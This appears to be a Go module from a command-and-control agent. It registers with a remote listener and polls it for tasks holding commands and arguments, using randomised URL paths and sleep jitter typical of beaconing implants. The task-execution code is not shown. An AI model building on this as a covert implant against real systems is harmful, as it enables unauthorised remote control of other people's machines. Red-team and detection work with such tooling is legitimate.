package core

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"strconv"
)

type registrationResponse struct {
	AgentID string `json:"agent_id"`
}

type taskLaunchMessage struct {
	TaskID    string         `json:"task_id"`
	Command   string         `json:"command"`
	Arguments map[string]any `json:"arguments"`
	Data      any            `json:"data"`
}

type Connection struct {
	remoteHost           string
	remotePort           int
	sleepTime            float64
	sleepTimeJitter      float64
	agentType            string
	tasksUrlPaths        []string
	resultsUrlPaths      []string
	registrationUrlPaths []string
	extraHeaders         map[string]string
	listenerBaseUrl      string
	agentID              *string
}

func NewConnection(
	remoteHost string,
	remotePort int,
	sleepTime float64,
	sleepTimeJitter float64,
	agentType string,
	tasksUrlPathsJson []string,
	resultsUrlPathsJson []string,
	registrationUrlPathsJson []string,
	extraHeadersJson map[string]string,
) *Connection {
	return &Connection{
		remoteHost:           remoteHost,
		remotePort:           remotePort,
		sleepTime:            sleepTime,
		sleepTimeJitter:      sleepTimeJitter,
		agentType:            agentType,
		tasksUrlPaths:        tasksUrlPathsJson,
		resultsUrlPaths:      resultsUrlPathsJson,
		registrationUrlPaths: registrationUrlPathsJson,
		extraHeaders:         extraHeadersJson,
		listenerBaseUrl:      "http://" + remoteHost + ":" + strconv.Itoa(remotePort),
		agentID:              nil,
	}
}

func (c *Connection) RegisterWithListener(extraHeaders map[string]string) (string, error) {
	resp, err := http.Get(c.listenerBaseUrl + c.registrationUrlPaths[rand.Intn(len(c.registrationUrlPaths))])
	if err != nil {
		return "", err
	}

	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("Invalid response: %s", resp.Status)
	}

	registrationResponse := registrationResponse{}
	err = json.NewDecoder(resp.Body).Decode(&registrationResponse)
	if err != nil {
		return "", err
	}

	return registrationResponse.AgentID, nil
}

func (c *Connection) GetTasksFromListener() ([]taskLaunchMessage, error) {
	resp, err := http.Get(c.listenerBaseUrl + c.tasksUrlPaths[rand.Intn(len(c.tasksUrlPaths))])
	if err != nil {
		return []taskLaunchMessage{}, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return []taskLaunchMessage{}, fmt.Errorf("Invalid response: %s", resp.Status)
	}

	var tasks []taskLaunchMessage
	err = json.NewDecoder(resp.Body).Decode(&tasks)
	if err != nil {
		return []taskLaunchMessage{}, err
	}
	return tasks, nil
}
